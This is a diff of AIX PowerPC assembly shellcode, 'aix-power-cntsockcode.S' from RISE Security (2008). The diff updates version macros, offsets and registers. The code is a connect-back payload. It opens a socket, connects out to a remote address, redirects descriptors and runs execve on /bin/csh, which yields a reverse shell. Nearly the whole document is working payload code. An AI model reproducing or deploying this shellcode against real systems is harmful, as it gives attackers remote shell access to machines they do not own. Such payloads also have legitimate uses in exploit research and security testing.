@@ -1,7 +1,7 @@
 /*
- *  $Id: aix-power-cntsockcode.S 6 2008-09-10 17:27:50Z ramon $
+ *  $Id: aix-power-cntsockcode.S 40 2008-11-17 02:45:30Z ramon $
  *
- *  aix-power-cntsockcode.S - AIX POWER/PowerPC Network connect code
+ *  aix-power-cntsockcode.S - AIX Power Network connect code
  *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
  *
  *  This library is free software; you can redistribute it and/or
@@ -22,14 +22,14 @@
 
 /*
  * Compile with the following command.
- * $ gcc -Wall -DVERSION -o aix-power-cntsockcode aix-power-cntsockcode.S
+ * $ gcc -Wall -DAIXLEVEL -o aix-power-cntsockcode aix-power-cntsockcode.S
  *
- * Where VERSION is one of the currently supported AIX versions.
- * -DV41    AIX 4.1
- * -DV42    AIX 4.2
- * -DV43    AIX 4.3
- * -DV4330  AIX 4.3.3.0
- * -DV53    AIX 5.3
+ * Where AIXLEVEL is one of the currently supported AIX levels.
+ * -DV410   AIX 4.1.0
+ * -DV420   AIX 4.2.0
+ * -DV430   AIX 4.3.0
+ * -DV433   AIX 4.3.3
+ * -DV530   AIX 5.3.0
  *
  */
 
@@ -46,7 +46,7 @@ syscallcode:
     bnel    syscallcode
     mflr    %r30
     cal     %r30,511(%r30)
-    cal     %r30,-475(%r30)
+    cal     %r30,-511+36(%r30)
     mtctr   %r30
     bctr
     .long   0xff0204d2
@@ -56,14 +56,13 @@ syscallcode:
     cal     %r30,-8(%r30)
 
 cntsockcode:
+    lil     %r29,__CAL
 
     # socket
 
-    lil     %r29,__CAL
-
     # xor     %r5,%r5,%r5
-    cal     %r4,-510(%r29)
-    cal     %r3,-509(%r29)
+    cal     %r4,-511+1(%r29)
+    cal     %r3,-511+2(%r29)
     cal     %r2,__NC_socket(%r29)
     mtctr   %r30
     bctrl
@@ -71,7 +70,7 @@ cntsockcode:
 
     # connect
 
-    cal     %r5,-495(%r29)
+    cal     %r5,-511+16(%r29)
     cal     %r4,-8(%r30)
     cal     %r2,__NC_connect(%r29)
     mtctr   %r30
@@ -79,7 +78,7 @@ cntsockcode:
 
     # close
 
-    cal     %r27,-509(%r29)
+    cal     %r27,-511+2(%r29)
 
 0:
     mr      %r3,%r27
@@ -101,25 +100,24 @@ cntsockcode:
 
 shellcode:
     # lil     %r31,__CAL
-
     xor.    %r5,%r5,%r5
     bnel    shellcode
-
     # mflr    %r30
     # cal     %r30,511(%r30)
-    # cal     %r3,-475(%r30)
-    mflr    %r26
-    cal     %r26,511(%r26)
-    cal     %r3,-475(%r26)
-
+    # cal     %r3,-511+40(%r30)
+    # stb     %r5,-511+48(%r30)
+    mflr    %r24
+    cal     %r24,511(%r24)
+    cal     %r3,-511+40(%r24)
+    stb     %r5,-511+48(%r24)
     stu     %r5,-4(%r1)
     stu     %r3,-4(%r1)
     mr      %r4,%r1
-
     # cal     %r2,__NC_execve(%r31)
     cal     %r2,__NC_execve(%r29)
-
+    # crorc   %cr6,%cr6,%cr6
+    # .long   0x44ffff02
     mtctr   %r30
-    bctr
+    bctrl
     .asciz  "/bin/csh"
 
